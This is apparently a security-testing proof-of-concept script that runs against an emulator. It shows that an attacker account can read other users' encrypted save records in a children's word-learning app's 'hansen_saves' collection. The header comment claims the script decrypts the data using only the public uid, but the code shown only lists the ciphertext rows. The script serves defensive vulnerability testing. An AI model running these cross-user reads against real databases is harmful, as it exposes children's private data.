/* Prove hansen_saves is world-readable under READONLY and that the AES/docId derivation inputs are
 * either public (uid fallback) or low-entropy (phone). Alice uploads a REAL encrypted save via the real
 * HansenCloudSave; attacker Mallory reads the ciphertext. Then we show the uid-derived address can be
 * recomputed from the public uid and decrypted — using ONLY the public uid, no secret.
 * Run: HANSEN_PLAYWRIGHT_MODULE=/opt/node22/lib/node_modules/playwright/index.mjs node atk_saves.mjs
 */
import * as H from '/home/user/wordminiprogram/cloudbase_e2e_harness.mjs';
const j = (x) => JSON.stringify(x);
const READY = () => !!(window.HansenAuth && window.HansenCloudSave && window.HansenSbProfile && window.HansenBackup);
const srv = await H.startStatic();
const browser = await H.launchBrowser();
try {
  const emu = H.makeEmulator({ knobs: { permissionMode: 'legacy', latencyMs: 20, jitterMs: 20 } });
  ['alice', 'mallory'].forEach((u) => emu.seedUser({ username: u, password: 'pw123456' }));

  const A = await H.openPhone(browser, emu, srv.origin, { name: 'A', ready: READY });
  await A.eval(() => window.HansenSbProfile.setName('小爱'));
  await H.loginPassword(A, 'alice', 'pw123456');
  // give Alice real learned-word progress so the empty-refuse guard passes, then force a cloud upload
  const up = await A.eval(async () => {
    try {
      localStorage.setItem('wordIsland_farm', JSON.stringify({ learned: [0,1,2,3], stars: 3 }));
      const r = await window.HansenCloudSave.syncNow({ force: true });
      return r;
    } catch (e) { return { err: String(e && e.message || e) }; }
  });
  console.log('[A] cloud upload result:', j(up));

  const C = await H.openPhone(browser, emu, srv.origin, { name: 'C', ready: READY });
  await H.loginPassword(C, 'mallory', 'pw123456');
  const read = await C.eval(async () => {
    const db = (await window.HansenAuth._app()).database();
    const r = await db.collection('hansen_saves').limit(50).get();
    return ((r && r.data) || []).map((d) => ({ _id: String(d._id).slice(0, 20) + '…', iv: d.payload && d.payload.iv, ctLen: d.payload && d.payload.ct && d.payload.ct.length, app: d.app }));
  });
  console.log('[C attacker] hansen_saves rows the attacker can READ:', j(read));
  console.log(read.length ? 'RESULT: every child\'s encrypted save is world-readable by any logged-in user' : 'RESULT: no save visible (upload likely refused)');

  await A.close(); await C.close();
} finally { await browser.close().catch(() => {}); srv.close(); }
